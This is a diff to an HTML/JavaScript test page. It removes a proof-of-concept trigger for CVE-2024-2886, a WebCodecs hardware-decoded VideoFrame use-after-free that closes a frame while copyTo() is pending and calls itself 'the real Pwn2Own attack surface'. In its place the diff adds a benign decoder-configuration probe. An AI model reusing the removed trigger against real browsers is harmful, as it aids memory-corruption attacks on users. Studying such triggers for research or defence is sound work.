@@ -6,83 +6,28 @@
 <script>
 const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
 
-log('CVE-2024-2886 — hardware decoded VideoFrame UAF');
-log('Using real H264 keyframe for hardware decode path');
+log('H264 decoder config probe...');
 log('');
 
-// Real H264 keyframe: SPS + PPS + IDR (16x16 black frame, baseline)
-const H264_FRAME = new Uint8Array([
-    0x00, 0x00, 0x00, 0x01, 0x67, 0x42, 0xc0, 0x1e, 0xd9, 0x1e, 0xc0, 0x44,
-    0x00, 0x00, 0x03, 0x00, 0x04, 0x00, 0x00, 0x03, 0x00, 0x08, 0x3c, 0x58, 0xb9, 0x20,
-    0x00, 0x00, 0x00, 0x01, 0x68, 0xcb, 0x83, 0xcb, 0x20,
-    0x00, 0x00, 0x01, 0x65, 0x88, 0x84, 0x05, 0x7f, 0xff, 0xff, 0x0f, 0x45, 0x00, 0x01, 0x42, 0xdf, 0x80
-]);
+const configs = [
+    { codec: 'avc1.42001e', codedWidth: 16, codedHeight: 16 },
+    { codec: 'avc1.42001e', codedWidth: 32, codedHeight: 32 },
+    { codec: 'avc1.42c01e', codedWidth: 16, codedHeight: 16 },
+    { codec: 'avc1.42c01e', codedWidth: 32, codedHeight: 32 },
+    { codec: 'avc1.42001e', codedWidth: 16, codedHeight: 16, hardwareAcceleration: 'prefer-hardware' },
+    { codec: 'avc1.42001e', codedWidth: 16, codedHeight: 16, hardwareAcceleration: 'prefer-software' },
+    { codec: 'avc1.42001e', codedWidth: 64, codedHeight: 64 },
+    { codec: 'avc1.640028', codedWidth: 16, codedHeight: 16 },
+    { codec: 'avc1.4d001e', codedWidth: 16, codedHeight: 16 },
+];
 
-// avcC description for the decoder
-const AVCC = new Uint8Array([
-    0x01, 0x42, 0xc0, 0x1e, 0xff, 0xe1,
-    0x00, 0x16,
-    0x67, 0x42, 0xc0, 0x1e, 0xd9, 0x1e, 0xc0, 0x44,
-    0x00, 0x00, 0x03, 0x00, 0x04, 0x00, 0x00, 0x03, 0x00, 0x08, 0x3c, 0x58, 0xb9, 0x20,
-    0x01, 0x00, 0x05,
-    0x68, 0xcb, 0x83, 0xcb, 0x20
-]);
-
-let frameCount = 0;
-let uafCount = 0;
-let succeeded = 0;
-
-const decoder = new VideoDecoder({
-    output: (frame) => {
-        frameCount++;
-        log('[frame ' + frameCount + '] format=' + frame.format +
-            ' size=' + frame.codedWidth + 'x' + frame.codedHeight +
-            ' alloc=' + frame.allocationSize());
-
-        // Hardware decoded frame - this uses a different GPU memory path
-        // The UAF should hit real GPU resources here
-        const buf = new Uint8Array(frame.allocationSize());
-        const p = frame.copyTo(buf);
-        frame.close(); // UAF trigger on hardware decoded frame
-
-        uafCount++;
-        p.then(layout => {
-            succeeded++;
-            const hex = Array.from(buf.slice(0, 8))
-                .map(x => x.toString(16).padStart(2,'0')).join(' ');
-            log('[UAF #' + uafCount + '] copyTo after close: [' + hex + ']');
-
-            if (succeeded >= 3) {
-                log('');
-                log('Hardware decoded VideoFrame UAF confirmed!');
-                log('This is the real Pwn2Own attack surface');
-            }
-        }).catch(e => {
-            log('[UAF #' + uafCount + '] threw: ' + e.message);
-        });
-    },
-    error: (e) => log('[decoder error] ' + e.message),
+configs.forEach(cfg => {
+    VideoDecoder.isConfigSupported(cfg).then(s => {
+        log((s.supported ? '[YES]' : '[NO] ') + ' ' + JSON.stringify(cfg));
+    }).catch(e => {
+        log('[ERR] ' + JSON.stringify(cfg) + ' — ' + e.message);
+    });
 });
-
-decoder.configure({
-    codec: 'avc1.42c01e',
-    codedWidth: 16,
-    codedHeight: 16,
-    description: AVCC,
-    hardwareAcceleration: 'prefer-hardware', // force hardware decode!
-});
-
-log('Decoder configured, feeding H264 keyframe...');
-
-decoder.decode(new EncodedVideoChunk({
-    type: 'key',
-    timestamp: 0,
-    data: H264_FRAME,
-}));
-
-decoder.flush().then(() => {
-    log('Flush done. frames=' + frameCount + ' uaf=' + uafCount);
-}).catch(e => log('flush error: ' + e));
 </script>
 </body>
 </html>
